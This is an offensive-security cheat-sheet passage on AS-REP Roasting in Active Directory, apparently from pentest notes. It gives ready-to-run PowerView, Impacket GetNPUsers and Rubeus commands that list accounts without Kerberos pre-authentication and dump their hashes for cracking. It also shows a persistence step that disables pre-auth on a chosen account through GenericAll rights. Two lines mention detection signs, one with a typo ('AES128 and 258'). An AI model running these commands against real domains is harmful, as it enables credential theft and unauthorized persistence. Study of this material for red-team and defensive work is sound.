![](img/unnamed.png)
Hash format: RC4 (hashcat 18200)
- Creates 4768 event, multiple 4768 event over short time from one user can standout.
- Windows tickets uses AES128 and 258, RC4 tickets can standout.

(PowerView) Enumerating vulnerable users
```powershell
Get-DomainUser -PreauthNotRequired -verbose
```
(Get-NPUsers) AS-REP Roasting
```bash
Get-NPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip <IP>
```
(Rubeus) AS-REP Roasting (default john format)
- Request RC4-encrypted tickets
```bash
Rubeus.exe asreproast /format:hashcat /nowrap
```
### Persistence
Force pre-auth not required for user where you have GenericAll permissions (or permission to write properties).
```powershell
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```